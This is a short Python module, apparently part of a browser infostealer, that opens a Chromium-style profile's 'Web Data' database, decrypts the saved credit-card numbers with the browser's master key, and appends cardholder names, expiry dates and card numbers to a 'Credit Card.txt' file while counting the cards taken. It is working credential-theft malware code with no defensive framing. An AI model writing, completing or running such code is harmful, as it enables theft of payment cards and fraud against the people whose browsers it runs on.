import os
import sqlite3

# -------------------------------------------------------
from modules.Browsers._data_breeding_ import Credits
from modules.Browsers.decrypt import decrypt_password
# -------------------------------------------------------

import log_Style



def get_credit_cards(profilePath: str, masterKey: bytes, creaditCardFile: str)-> None:
    cards_db: str = f'{profilePath}\\Web Data'
    if not os.path.exists(cards_db):
        return

    try:
        with sqlite3.connect(cards_db) as conn:
            cursor: object = conn.cursor()
            
            cursor.execute(
                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                
                
                if not row[3]:
                    continue
                
                card_number:bytes = decrypt_password(row[3], masterKey)
               
                if not card_number:
                    continue
                log_Style.ALL_CREADIT += 1
                with open(f'{creaditCardFile}\\Credit Card.txt', "a", encoding='utf-8', errors='ignore') as creaditFile:
                    creaditFile.write(str(Credits(row[0], row[1], row[2], card_number, row[4])))
    except Exception as e:
        print(e)
 
